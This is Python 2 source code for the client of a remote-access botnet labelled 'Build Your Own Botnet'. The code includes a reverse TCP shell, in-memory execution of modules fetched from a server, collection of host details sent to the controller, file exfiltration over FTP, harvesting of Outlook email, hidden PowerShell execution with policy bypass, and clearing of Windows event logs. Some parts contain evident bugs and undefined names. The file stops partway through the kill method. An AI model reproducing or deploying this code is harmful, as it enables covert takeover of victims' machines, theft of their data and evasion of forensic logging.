#!/usr/bin/python
"""
88                                  88
88                                  88
88                                  88
88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
88       d8  `8b   d8'  8b       d8 88       d8
88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
                d8'
               d8'

Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""

# standard library

import os
import sys
import imp
import time
import json
import zlib
import uuid
import Queue
import base64
import ctypes
import struct
import socket
import random
import urllib
import urllib2
import marshal
import zipfile
import logging
import hashlib
import functools
import threading
import cStringIO
import contextlib
import subprocess
import collections
import logging.handlers


# globals

__threads = {}


# decorators

def config(*arg, **options):
    """
    Configuration decorator for adding new function attributes
    """
    def _config(function):
        @functools.wraps(function)
        def wrapper(*args, **kwargs):
            return function(*args, **kwargs)
        for k,v in options.items():
            setattr(wrapper, k, v)
        return wrapper
    return _config


def threaded(function):
    """
    Decorator for making a function threaded
    """
    @functools.wraps(function)
    def _threaded(*args, **kwargs):
        t = threading.Thread(target=function, args=args, kwargs=kwargs, name=time.time())
        t.daemon = True
        t.start()
        return t
    return _threaded



class Importer():
    """
    Remote Importer (Build Your Own Botnet)

    A remote importer object which can be added to `sys.meta_path` 
    to enable clients to directly import modules from the server
    that are missing from the local host.
    """
    def __init__(self, modules, base_url, debug=False):
        """
        Create new Importer instance
            
          `Required`
        :param list modules:     list of packages or module names 
        :param str base_url:     base URL of the server

          `Optional`
        :param bool debug:       enable/disable debugging mode  
        """
        self.module_names = modules
        self.base_url     = base_url + '/'
        self.non_source   = False
        self.logger       = self._debugger(logging.INFO if debug else logging.CRITICAL)


    def _debugger(self, level):
        logger = logging.getLogger('Importer')
        logger.setLevel(level)
        logger.addHandler(logging.StreamHandler())
        return logger


    def _fetch_compiled(self, url) :
        module_src = None
        try :
            module_compiled = urllib2.urlopen(url + 'c').read()
            try :
                module_src = marshal.loads(module_compiled[8:])
                return module_src
            except ValueError :
                pass
            try :
                module_src = marshal.loads(module_compiled[12:])
                return module_src
            except ValueError :
                pass
        except IOError as e:
            self.logger.debug("[-] No compiled version ('.pyc') for '%s' module found!" % url.split('/')[-1])
        return module_src


    def find_module(self, fullname, path=None):
        """
        Find a module/package on the server if it exists

        `Required`
        :param str fullname:    full package name

        `Optional`
        :param str path:        remote path to search
        """
        self.logger.debug("FINDER=================")
        self.logger.debug("[!] Searching %s" % fullname)
        self.logger.debug("[!] Path is %s" % path)
        self.logger.debug("[@] Checking if in declared remote module names >")
        if fullname.split('.')[0] not in self.module_names:
            self.logger.debug("[-] Not found!")
            return None
        self.logger.debug("[@] Checking if built-in >")
        try:
            loader = imp.find_module(fullname, path)
            if loader:
                return None
                self.logger.info("[-] Found locally!")
        except ImportError:
            pass
        self.logger.debug("[@] Checking if it is name repetition >")
        if fullname.split('.').count(fullname.split('.')[-1]) > 1:
            self.logger.info("[-] Found locally!")
            return None
        self.logger.info("[*] Module/Package '%s' can be loaded!" % fullname)
        return self

    def load_module(self, name):
        """
        Load a module/package into memory (never touches the disk)

        `Required`
        :param str name:    name of the module/package to load
        """
        imp.acquire_lock()
        self.logger.debug("LOADER=================")
        self.logger.info("[+] Loading %s" % name)
        if name in sys.modules:
            self.logger.debug('[+] Module "%s" already loaded!' % name)
            imp.release_lock()
            return sys.modules[name]
        if name.split('.')[-1] in sys.modules:
            imp.release_lock()
            self.logger.info('[+] Module "%s" loaded as a top level module!' % name)
            return sys.modules[name.split('.')[-1]]
        module_url = self.base_url + '%s.py' % name.replace('.', '/')
        package_url = self.base_url + '%s/__init__.py' % name.replace('.', '/')
        zip_url = self.base_url + '%s.zip' % name.replace('.', '/')
        final_url = None
        final_src = None
        try:
            self.logger.info("[+] Trying to import as package from: '%s'" % package_url)
            package_src = None
            if self.non_source :
                package_src = self._fetch_compiled(package_url)
            if package_src == None :
                package_src = urllib2.urlopen(package_url).read()
            final_src = package_src
            final_url = package_url
        except IOError as e:
            package_src = None
            self.logger.info("[-] '%s' is not a package:" % name)
        if final_src == None:
            try:
                self.logger.info("[+] Trying to import as module from: '%s'" % module_url)
                module_src = None
                if self.non_source :
                    module_src = self._fetch_compiled(module_url)
                if module_src == None :
                    module_src = urllib2.urlopen(module_url).read()
                final_src = module_src
                final_url = module_url
            except IOError as e:
                module_src = None
                self.logger.info("[-] '%s' is not a module:" % name)
                self.logger.debug("[!] '%s' not found in HTTP repository. Moving to next Finder." % name)
                imp.release_lock()
                return None
        self.logger.info("[+] Importing '%s'" % name)
        mod = imp.new_module(name)
        mod.__loader__ = self
        mod.__file__ = final_url
        if not package_src:
            mod.__package__ = name
        else:
            mod.__package__ = name.split('.')[0]
        mod.__path__ = ['/'.join(mod.__file__.split('/')[:-1]) + '/']
        self.logger.debug("[+] Ready to execute '%s' code" % name)
        sys.modules[name] = mod
        exec(final_src, mod.__dict__)
        self.logger.info("[+] '%s' imported succesfully!" % name)
        imp.release_lock()
        return mod




class Util():

    """
    Utilities (Build Your Own Botnet)

    A simple wrapper for all the miscellaneous,
    useful methods that are used by many other 
    classes/methods that prevents the global
    namespace from getting polluted.
    """

    @staticmethod
    def debug(info):
        """
        Log debugging info to the console if debugging is enabled
        """
        if __debug__:
            debugger = logging.getLogger(__name__)
            debugger.setLevel(logging.DEBUG)
            debgger.handlers = [logging.StreamHandler()]
            debugger.debug(str(info))


    @staticmethod
    def task(client, task, result, **kwargs):
        """
        Input a JSON/dictionary type object and return a new task
        """
        return collections.namedtuple('Task', ['client', 'task', 'result'] + kwargs.keys())(*[client, task, result] + kwargs.values())



    @staticmethod
    @contextlib.contextmanager
    def remote_repo(modules, base_url='http://localhost:8000/'):
        """
        Context manager object to add a new Importer instance 
        to `sys.meta_path`, enabling direct remote imports,
        then remove the instance from `sys.meta_path` 
        """
        remote_importer =  Importer(modules, base_url)
        sys.meta_path.append(remote_importer)
        yield
        for importer in sys.meta_path:
            if importer.base_url[:-1] == base_url:
                sys.meta_path.remove(importer)


    @staticmethod
    def remote_import(module, base_url='http://localhost:8000'):
        """
        Use a remote_repo object to remotely import a 
        Python package/module into the current context

        `Requires`
        :param str module:      name of module to import

        `Optional`
        :param str base_url:    base URL of server hosting packages/modules
        """
        with Util.remote_repo([module], base_url):
            try:
                exec "import %s" % module in globals()
                return globals()[module]
            except ImportError as e:
                Util.debug(e)


    @staticmethod
    def encrypt_aes(plaintext, key, padding='\x00'):
        """
        Encrypt plaintext

        :attr cipher:   AES
        :attr mode:     CBC
        :attr key_size: 256-bits

        'Requires':
        :param str ciphertext:    encrypted block of data
        :param str key:           session encryption key 

        `Optional`
        :param str padding:       padding character (default: '\x00' [null byte])
        """
        text        = bytes(data) + (int(AES.block_size) - len(bytes(data)) % int(AES.block_size)) * bytes(padding)
        iv          = os.urandom(Crypto.Cipher.AES.block_size)
        cipher      = Crypto.Cipher.AES.new(key[:max(Crypto.Cipher.AES.key_size)], Crypto.Cipher.AES.MODE_CBC, iv)
        ciphertext  = iv + cipher.encrypt(text)
        hmac_sha256 = Crypto.Hash.HMAC.new(key[max(Crypto.Cipher.AES.key_size):], msg=ciphertext, digestmod=Crypto.Hash.SHA256).digest()
        return base64.b64encode(ciphertext + hmac_sha256)


    @staticmethod
    def decrypt_aes(ciphertext, key, padding='\x00'):
        """
        Decrypt ciphertext

        :attr cipher:   AES
        :attr mode:     CBC
        :attr key_size: 256-bits

        'Requires'
        :param str ciphertext:    encrypted block of data
        :param str key:           session encryption key 

        `Optional`
        :param str padding:       padding character (default: '\x00' [null byte])
        """
        ciphertext  = base64.b64decode(ciphertext)
        iv          = ciphertext[:Crypto.Cipher.AES.block_size]
        cipher      = Crypto.Cipher.AES.new(key[:max(Crypto.Cipher.AES.key_size)], Crypto.Cipher.AES.MODE_CBC, iv)
        read_hmac   = ciphertext[-Crypto.Hash.SHA256.digest_size:]
        calc_hmac   = Crypto.Hash.HMAC.new(key[max(Crypto.Cipher.AES.key_size):], msg=ciphertext[:-Crypto.Hash.SHA256.digest_size], digestmod=Crypto.Hash.SHA256).digest()
        Util.debug('HMAC-SHA256 hash authentication check failed - transmission may have been compromised') if calc_hmac != read_hmac else None
        return cipher.decrypt(ciphertext[Crypto.Cipher.AES.block_size:-Crypto.Hash.SHA256.digest_size]).rstrip(padding)


    @staticmethod
    def platform():
        """
        Check the platform of the client host machine

        Returns platform as a string (win32, linux2, darwin)
        """
        try:
            return sys.platform
        except Exception as e:
            Util.debug("{} error: {}".format(platform.func_name, str(e)))


    @staticmethod
    def public_ip():
        """
        Get the public IP address of client host machine

        Returns address as a string
        """
        try:
            return urllib2.urlopen('http://api.ipify.org').read()
        except Exception as e:
            Util.debug("{} error: {}".format(public_ip.func_name, str(e)))


    @staticmethod
    def local_ip():
        """
        Get the local IP address of the client host machine

        Returns address as a string
        """
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception as e:
            Util.debug("{} error: {}".format(local_ip.func_name, str(e)))


    @staticmethod
    def mac_address():
        """
        Get the MAC address of client host machine

        Returns address as a string
        """
        try:
            return ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0,11,2)).upper()
        except Exception as e:
            Util.debug("{} error: {}".format(mac_address.func_name, str(e)))


    @staticmethod
    def architecture():
        """
        Check if host machine has 32-bit or 64-bit processor architecture

        Returns architecture as an integer (32/64)
        """
        try:
            return int(struct.calcsize('P') * 8)
        except Exception as e:
            Util.debug("{} error: {}".format(architecture.func_name, str(e)))


    @staticmethod
    def device():
        """
        Check the name of the host device

        Returns the device name as a string
        """
        try:
            return socket.getfqdn(socket.gethostname())
        except Exception as e:
            Util.debug("{} error: {}".format(device.func_name, str(e)))


    @staticmethod
    def username():
        """
        Attempt to find the username of the currently logged in user

        Returns username as a string
        """
        try:
            return os.getenv('USER', os.getenv('USERNAME'))
        except Exception as e:
            Util.debug("{} error: {}".format(username.func_name, str(e)))


    @staticmethod
    def administrator():
        """
        Check privileges of the currently logged in user on the host

        Returns True if current user is administrator, otherwise False
        """
        try:
            return bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0)
        except Exception as e:
            Util.debug("{} error: {}".format(administrator.func_name, str(e)))


    @staticmethod
    def ipv4(address):
        """
        Check if valid IPv4 address

        `Required`
        :param str address:   string to check

        Returns True if input is valid IPv4 address, otherwise False
        """
        try:
            if socket.inet_aton(str(address)):
               return True
        except:
            return False


    @staticmethod
    def variable(length=6):
        """
        Generate a random alphanumeric variable name of given length

        `Optional`
        :param int length:    length of the variable name to generate
        """
        try:
            return random.choice([chr(n) for n in range(97,123)]) + str().join(random.choice([chr(n) for n in range(97,123)] + [chr(i) for i in range(48,58)] + [chr(i) for i in range(48,58)] + [chr(z) for z in range(65,91)]) for x in range(int(length)-1))
        except Exception as e:
            Util.debug("{} error: {}".format(variable.func_name, str(e)))


    @staticmethod
    def status(timestamp):
        """
        Check the status of a job/thread

        `Required`
        :param float timestamp:   timestamp (seconds since the Epoch)
        """
        try:
            assert float(timestamp)
            c = time.time() - float(timestamp)
            data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
                  '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
                  '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
                  '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
            return ', '.join([i for i in data if i])
        except Exception as e:
            Util.debug("{} error: {}".format(job_status.func_name, str(e)))


    @staticmethod
    def post(url, headers={}, data={}):
        """
        Make a HTTP post request and return response

        `Required`
        :param str url:       URL of target web page

        `Optional`
        :param dict headers:  HTTP request headers
        :param dict data:     HTTP request post data
        """
        try:
            dat = urllib.urlencode(data)
            req = urllib2.Request(str(url), data=dat) if data else urllib2.Request(url)
            for key, value in headers.items():
                req.headers[key] = value
            return urllib2.urlopen(req).read()
        except Exception as e:
            Util.debug("{} error: {}".format(post_request.func_name, str(e)))


    @staticmethod
    def alert(text, title):
        """
        Windows alert message box

        `Required`
        :param str text:    string of text for the alert message

        `Optional`
        :param str title:   alert box title (default: 'Windows Alert')
        """
        try:
            t = threading.Thread(target=ctypes.windll.user32.MessageBoxA, args=(None, text, title, 0))
            t.daemon = True
            t.start()
            return t
        except Exception as e:
            Util.debug("{} error: {}".format(windows_alert.func_name, str(e)))


    @staticmethod
    def normalize(source):
        """
        Normalize data/text/stream

        `Required`
        :param str source:    data or filename
        """
        try:
            if os.path.isfile(str(source)):
                return open(source, 'rb').read()
            elif hasattr(source, 'getvalue'):
                return source.getvalue()
            elif hasattr(source, 'read'):
                if hasattr(source, 'seek'):
                    source.seek(0)
                return source.read()
            else:
                return bytes(source)
        except Exception as e2:
            Util.debug("{} error: {}".format(imgur.func_name, str(e2)))


    @staticmethod
    def registry_key(registry_key, key, value):
        """
        Create a new Windows Registry Key in HKEY_CURRENT_USER

        `Required`
        :param str key:         primary registry key name
        :param str subkey:      registry key sub-key name
        :param str value:       registry key sub-key value

        Returns True if successful, otherwise False
        """
        if os.name == 'nt':
            try:
                if '_winreg' not in globals():
                    _winreg = Util.remote_import('_winreg')
                reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, registry_key, 0, _winreg.KEY_WRITE)
                _winreg.SetValueEx(reg_key, key, 0, _winreg.REG_SZ, value)
                _winreg.CloseKey(reg_key)
                return True
            except Exception as e:
                Util.debug("{} error: {}".format(str(e)))
        return False


    @staticmethod
    def png(image):
        """
        Transforms raw image data into a valid PNG data

        `Requires`
        :param image:  `numpy.darray` object OR `PIL.Image` object

        Returns raw image data in PNG format
        """
        try:
            if 'numpy' not in globals():
                numpy = Util.remote_import('numpy')
            if isinstance(image, numpy.ndarray):
                width, height = (image.shape[1], image.shape[0])
                data = image.tobytes()
            elif hasattr(image, 'width') and hasattr(image, 'height') and hasattr(image, 'rgb'):
                width, height = (image.width, image.height)
                data = image.rgb
            else:
                raise TypeError("invalid input type: {}".format(type(image)))
            line = width * 3
            png_filter = struct.pack('>B', 0)
            scanlines = b"".join([png_filter + data[y * line:y * line + line] for y in range(height)])
            magic = struct.pack('>8B', 137, 80, 78, 71, 13, 10, 26, 10)
            ihdr = [b"", b'IHDR', b"", b""]
            ihdr[2] = struct.pack('>2I5B', width, height, 8, 2, 0, 0, 0)
            ihdr[3] = struct.pack('>I', zlib.crc32(b"".join(ihdr[1:3])) & 0xffffffff)
            ihdr[0] = struct.pack('>I', len(ihdr[2]))
            idat = [b"", b'IDAT', zlib.compress(scanlines), b""]
            idat[3] = struct.pack('>I', zlib.crc32(b"".join(idat[1:3])) & 0xffffffff)
            idat[0] = struct.pack('>I', len(idat[2]))
            iend = [b"", b'IEND', b"", b""]
            iend[3] = struct.pack('>I', zlib.crc32(iend[1]) & 0xffffffff)
            iend[0] = struct.pack('>I', len(iend[2]))
            fileh = cStringIO.StringIO()
            fileh.write(magic)
            fileh.write(b"".join(ihdr))
            fileh.write(b"".join(idat))
            fileh.write(b"".join(iend))
            fileh.seek(0)
            return fileh
        except Exception as e:
            Util.debug("{} error: {}".format(png_from_data.func_name, str(e)))


    @staticmethod
    def emails(emails):
        """
        Transforms MAPI object into JSON/dictionary format

        `Requires`
        :param MAPI emails:      emails from Outlook

        Returns JSON/dictionary formatted emails
        """
        try:
            output = {}
            while True:
                try:
                    email = emails.GetNext()
                except: break
                if email:
                    sender   = email.SenderEmailAddress.encode('ascii','ignore')
                    message  = email.Body.encode('ascii','ignore')[:100] + '...'
                    subject  = email.Subject.encode('ascii','ignore')
                    received = str(email.ReceivedTime).replace('/','-').replace('\\','')
                    result   = {'from': sender, 'subject': subject, 'message': message}
                    output[received] = result
                else: break
            return output
        except Exception as e:
            Util.debug("{} error: {}".format(emails.func_name, str(e)))



    @staticmethod
    def delete(target):
        """
        Tries to delete file via multiple methods until successful

        `Requires`
        :param str target:     target filename
        """
        try:
            if os.path.isfile(target):
                try:
                    os.chmod(target, 777)
                except: pass
                if os.name is 'nt':
                    try:
                        _ = os.popen('attrib -h -s -r %s' % target).read()
                    except: pass
                try:
                    os.remove(target)
                except: pass
                try:
                    _ = os.popen(bytes('del /f /q %s' % target if os.name is 'nt' else 'rm -f %s' % target)).read()
                except: pass
            elif os.path.isdir(target):
                try:
                    _ = os.popen(bytes('rmdir /s /q %s' % target if os.name is 'nt' else 'rm -f %s' % target)).read()
                except: pass
            else:
                pass
        except Exception as e:
            Util.debug("{} error: {}".format(delete.func_name, str(e)))
            


    @staticmethod
    def clear_system_logs(logs=['application','security','setup','system']):
        """
        Clear Windows system logs 

        `Optional`
        :param list logs:  log names to clear 
        (default: application, security, setup, system)
        """
        if os.name == 'nt':
            for log in logs:
            try:
                output = Util.powershell('"& { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(\"%s\")}"' % log)
                if output:
                    Util.debug(output)
            except Exception as e:
                Util.debug("{} error: {}".format(clear_system_logs.func_name, str(e)))


    @staticmethod
    def kwargs(data):
        """
        Takes a string as input and returns a dictionary of keyword arguments

        `Requires`
        :param str data:       string to parse for keyword arguments

        Returns dictionary of keyword arguments as key-value pairs
        """
        try:
            return {i.partition('=')[0]: i.partition('=')[2] for i in str(data).split() if '=' in i}
        except Exception as e:
            Util.debug("{} error: {}".format(kwargs.func_name, str(e)))


    @staticmethod
    def powershell(code):
        """
        Execute code in Powershell.exe and return any results

        `Required`
        :param str code:      script block of Powershell code

        Returns Powershell output as string
        """
        if os.name is 'nt':
            try:
                ps = os.popen('where powershell').read().rstrip()
                if not os.path.exists(ps):
                    ps = r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe'
                return os.popen('{} -exec bypass -window hidden -noni -nop -encoded {}'.format(ps, base64.b64encode(code))).read()
            except Exception as e:
                Util.debug("{} error: {}".format(Util.powershell.func_name, str(e)))
        else:
            Util.debug("Powershell is for Windows platforms only")




class Session():
    """
    Session Handler (Build Your Own Botnet)
    
      - handles the low-level socket connection to the server
      - secure encryption key with Diffie-Hellman key agreement method
      - receiving and decrypting tasks received from the server 
      - encrypting and sending task results to the server 
    """
    def __init__(self, host, port, shell):
        """
        Create a new Session instance

        `Requires`
        :param str host:            hostname or IP address of server
        :param int port:            port number of server
        :param Shell shell:         Shell instance

        `Optional`
        :param bool encrypt:        encrypt/decrypt incoming/outgoing data
        :param bool connect:        automatically connect to server
        :param bool authenticate:   authenticate incoming/outgoing data
        """
        self._host      = host
        self._port      = port
        self._shell     = shell
        self.logger     = Util.task_logger(host, port)
        self.flags      = self.get_flags()
        self.connection = self.connectToServer(host, port)


    def connectToServer(self, host, port):
        """
        Create a new connection to the server

        `Requires`
        :param str host:            0.0.0.0 to 255.255.255.255
        :param int port:            1 to 65355

        Returns a connected socket object
        """
        try:
            if util.ipv4(host):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((host, port))
                sock.setblocking(True)
                key  = self.diffiehellman()
                info = self.session_info()
                return collections.namedtuple('Collections', ('socket','key','info'))(sock, key, info)
            else:
                raise ValueError('invalid IPv4 address')
        except Exception as e:
            util.debug("{} error: {}".format(self.connect_to_server.func_name, str(e)))


    def diffiehellman(self):
        """
        Diffie-Hellman Internet Key Exchange (RFC 2631)

        Returns a 256-bit shared secret encryption key as a string
        """
        try:
            g  = 2
            p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
            a  = Crypto.Util.number.bytes_to_long(os.urandom(32))
            xA = pow(g, a, p)
            self.connection.socket.send(Crypto.Util.number.long_to_bytes(xA))
            xB = Crypto.Util.number.bytes_to_long(self.connection.socket.recv(256))
            x  = pow(xB, a, p)
            return Crypto.Hash.MD5.new(Crypto.Util.number.long_to_bytes(x)).hexdigest()
        except Exception as e:
            Util.debug("{} error: {}".format(self.diffiehellman.func_name, str(e)))


    def flags(self):
        """
        Flags object which holds thread event locks related to shell behavior

        Returns flag as a named tuple object with the following fields:
        :field threading.Event alive:   flag is set/unset to signal socket is ready for read/write
        :field threading.Event prompt:  flag is set/unset to signal the prompt thread to send/wait
        :field threading.Event passive: flag is set/unset to signal passive/active mode to threads
        """
        return collections.namedtuple('flag', ('alive','passive','prompt'))(threading.Event(), threading.Event(), threading.Event())


    def logger(self):
        """
        Task logger with socket handler that reports task results to server while in passive mode

        Returns task logger as a logging.Logger object
        """
        logger  = logging.getLogger(task['client'])
        record  = logging.makeLogRecord({'name': task['client'], 'msg': task})
        handler = logging.handlers.SocketHandler(self.connection.host, self.connection.port + 1)
        logger.handlers = [handler]
        return logger


    def session_info(self):
        """
        Send host information to server and get session inforation from server

        Returns session information as a dictionary object of key-value pairs
        """
        info = {function: getattr(Util, function)() for function in ['public_ip', 'local_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']}
        data = Util.encrypt_aes(json.dumps(info), self.key)
        msg  = struct.pack('L', len(data)) + data
        while True:
            sent = self.connection.socket.send(msg)
            if len(msg) - sent:
                msg = msg[sent:]
            else:
                break

        header_size = struct.calcsize('L')
        header      = self.connection.socket.recv(header_size)
        msg_len     = struct.unpack('L', header)[0]
        buff        = ''
        while len(buff) < msg_len:
            try:
                buff += self.connection.socket.recv(1)
            except (socket.timeout, socket.error):
                break

        if isinstance(buff, bytes) and len(buff):
            data = Util.decrypt_aes(buff, self.key)
            try:
                info = json.loads(data)
            except: pass
        return collections.namedtuple('Session', info.keys())(*info.values())
        


    def send_task(self, task):
        """
        Send encrypted task results to the server

        `Requires`
        :param dict task:
           :attr str uid:             task ID assigned by server
           :attr str task:            task assigned by server
           :attr str result:          completed task result
           :attr str client:          client ID assigned by server
           :attr timestamp issued:    time task was issued by server
           :attr timestamp complete:  time task was completed by client

        """
        try:
            if not isinstance(task, dict):
                raise TypeError('task must be a JSON dictionary object')
            if not 'client' in task:
                task['client'] = self.info.get('uid')
            if self.flags.passive.is_set():
                self.logger.info(task)
                return True
            else:
                if self.flags.alive.wait(timeout=1.0):
                    data = Util.encrypt_aes(json.dumps(task), self.key)
                    msg  = struct.pack('L', len(data)) + data
                    while True:
                        sent = self.connection.socket.send(msg)
                        if len(msg) - sent:
                            msg = msg[sent:]
                        else:
                            break
                    return True
                else:
                    Util.debug("connection timed out")
        except Exception as e:
            Util.debug('{} error: {}'.format(self.send_task.func_name, str(e)))
        return False


    def recv_task(self):
        """
        Receive and decrypt incoming task from server

        Returns task as a JSON dictionary object
        """
        try:
            hdr_len = struct.calcsize('L')
            hdr     = self.connection.socket.recv(hdr_len)
            msg_len = struct.unpack('L', hdr)[0]
            msg    = ''
            while len(msg) < msg_len:
                try:
                    msg += self.connection.socket.recv(1)
                except (socket.timeout, socket.error):
                    break
            if isinstance(msg, bytes) and len(msg):
                try:
                    return json.loads(Util.decrypt_aes(msg, self.key))
                except Exception as e:
                    Util.debug('Error: invalid task - {}'.format(msg))
        except Exception as e:
            Util.debug("{} error: {}".format(self.recv_task.func_name, str(e)))



class Shell():
    """
    Reverse TCP Shell (Build Your Own Botnet)

    A reverse TCP shell designed to provide remote access
    to the host platform native terminal, enabling direct
    control of the device from a remote server.
    """

    def __init__(self, host='localhost', port=1337, **kwargs):
        """
        Create an instance of a reverse TCP shell 

        `Required`
        :param str host:          server IP address
        :param int port:          server port number

        `Optional`
        :param str ftp:           host, user, password
        :param str imgur:         api_key
        :param str pastebin:      api_dev_key, api_user_key
        """
        self._abort     = False
        self.api        = self._api(**kwargs)
        self.commands   = self._commands()
        self.packages   = self._packages()
        self.modules    = self._modules()
        self.session    = Session(host, port)


    def _api(self, **kwargs):
        return collections.namedtuple('API', kwargs.keys())(*kwargs.values())


    def _commands(self):
        commands = {}
        for attr in vars(Shell):
            method = getattr(Shell, attr)
            if hasattr(method, 'command') and getattr(method, 'command'):
                commands[attr] = getattr(self, attr)
        return commands


    def _packages(self):
        try:
            if hasattr(self.session, 'connection'):
                host, port = self.session.connection.socket.getpeername()
                html = bs4.BeautifulSoup(urllib2.urlopen('http://{}:{}'.format(host, port + 2)).read(), "html.parser")
                return [os.path.splitext(href.get_text().encode().strip('/'))[0] for href in html.findAll('a')]
            else:
                raise Exception("No connection to server")
        except Exception as e:
            Util.debug(e)


    def _modules(self):
        try:
            if hasattr(self.session, 'connection'):
                host, port = self.session.connection.socket.getpeername()
                html = bs4.BeautifulSoup(urllib2.urlopen('http://{}:{}'.format(host, port + 3)).read(), "html.parser")
                return [os.path.splitext(href.get_text().encode().strip('/'))[0] for href in html.findAll('a')]
            else:
                raise Exception("No connection to server")
        except Exception as e:
            Util.debug(e)



    @threaded
    def _prompt_manager(self):
        while True:
            try:
                self.session.flags.prompt.wait()
                self.session.send_task(collections.namedtuple('Task', ('client', 'task', 'result'))(self.session.info.get('uid'), 'prompt', os.getcwd()))
                self.session.flags.prompt.clear()
                if self._abort:
                    break
            except Exception as e:
                Util.debug(e)
                break


    @threaded
    def _thread_manager(self):
        while True:
            jobs = self._threads.items()
            for task, worker in jobs:
                if not worker.is_alive():
                    dead = self._threads.pop(task, None)
                    del dead
            if self._abort:
                break
            time.sleep(0.5)


    @config(platforms=['win32','linux2','darwin'], command=True, usage='cd <path>')
    def cd(self, path='.'):
        """
        Change current working directory

        `Optional`
        :param str path:  target directory (default: current directory)
        """
        try:
            if os.path.isdir(path):
                return os.chdir(path)
            else:
                return os.chdir('.')
        except Exception as e:
            Util.debug("{} error: {}".format(self.cd.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='ls <path>')
    def ls(self, path='.'):
        """
        List the contents of a directory

        `Optional`
        :param str path:  target directory (default: current directory)
        """
        try:
            output = []
            if os.path.isdir(path):
                for line in os.listdir(path):
                    if len('\n'.join(output + [line])) < 2048:
                        output.append(line)
                    else:
                        break
                return '\n'.join(output)
            else:
                return "Error: path not found"
        except Exception as e:
            Util.debug("{} error: {}".format(self.ls.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='cat <path>')
    def cat(self, path):
        """
        Display file contents
        
          `Required`
        :param str path:  target filename
        """
        try:
            output = []
            if not os.path.isfile(path):
                return "Error: file not found"
            for line in open(path, 'rb').readlines():
                try:
                    line = line.rstrip()
                    if len(line) and not line.isspace():
                        if len('\n'.join(output + [line])) < 48000:
                            output.append(line)
                        else:
                            break
                except Exception as e1:
                    Util.debug("{} error: {}".format(self.cat.func_name, str(e1)))
            return '\n'.join(output)
        except Exception as e2:
            Util.debug("{} error: {}".format(self.cat.func_name, str(e2)))


    @config(platfoms=['win32','linux2','darwin'], command=False)
    def ftp(self, source, filetype=None, host=None, user=None, password=None):
        """
        Upload file/data to FTP server

        `Required`
        :param str source:    data or filename to upload

        `Optional`
        :param str filetype:  upload file type          (default: .txt)
        :param str host:      FTP server hostname       (default: Shell.api.ftp.host)
        :param str user:      FTP server login user     (default: Shell.api.ftp.user)
        :param str password:  FTP server login password (default: Shell.api.ftp.password)
        """
        try:
            path  = ''
            local = time.ctime().split()
            if os.path.isfile(str(source)):
                path   = source
                source = open(str(path), 'rb')
            elif hasattr(source, 'seek'):
                source.seek(0)
            else:
                source = cStringIO.StringIO(bytes(source))
            host = ftplib.FTP(host=self.api.ftp.host, user=self.api.ftp.user, password=self.api.ftp.password)
            addr = self.system['public_ip'] if self.system.get('public_ip') else Util.public_ip()
            if 'tmp' not in host.nlst():
                host.mkd('/tmp')
            if addr not in host.nlst('/tmp'):
                host.mkd('/tmp/{}'.format(addr))
            if path:
                path = '/tmp/{}/{}'.format(addr, os.path.basename(path))
            else:
                if filetype:
                    filetype = '.' + str(filetype) if not str(filetype).startswith('.') else str(filetype)
                    path = '/tmp/{}/{}'.format(addr, '{}-{}_{}{}'.format(local[1], local[2], local[3], filetype))
                else:
                    path = '/tmp/{}/{}'.format(addr, '{}-{}_{}'.format(local[1], local[2], local[3]))
            stor = host.storbinary('STOR ' + path, source)
            return path
        except Exception as e:
            return "{} error: {}".format(self.ftp.func_name, str(e))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='pwd')
    def pwd(self):
        """
        Show name of present working directory
        """
        try:
            return os.getcwd()
        except Exception as e:
            Util.debug("{} error: {}".format(self.pwd.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='eval <code>')
    def eval(self, code):
        """
        Execute Python code in current context

        `Required`
        :param str code:        string of Python code to execute
        """
        try:
            return eval(code)
        except Exception as e:
            Util.debug("{} error: {}".format(self.eval.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='wget <url>')
    def wget(self, url, filename=None):
        """
        Download file from url as temporary file and return filepath

        `Required`
        :param str url:         target URL to download ('http://...')

        `Optional`
        :param str filename:    name of the file to save the file as
        """
        if url.startswith('http'):
            try:
                path, _ = urllib.urlretrieve(url, filename) if filename else urllib.urlretrieve(url)
                return path
            except Exception as e:
                Util.debug("{} error: {}".format(self.wget.func_name, str(e)))
        else:
            return "Invalid target URL - must begin with 'http'"
        

    @config(platforms=['win32','linux2','darwin'], command=True, usage='kill')
    def kill(self):
        """
        Shutdown the current connection and reset session
        """
        try:
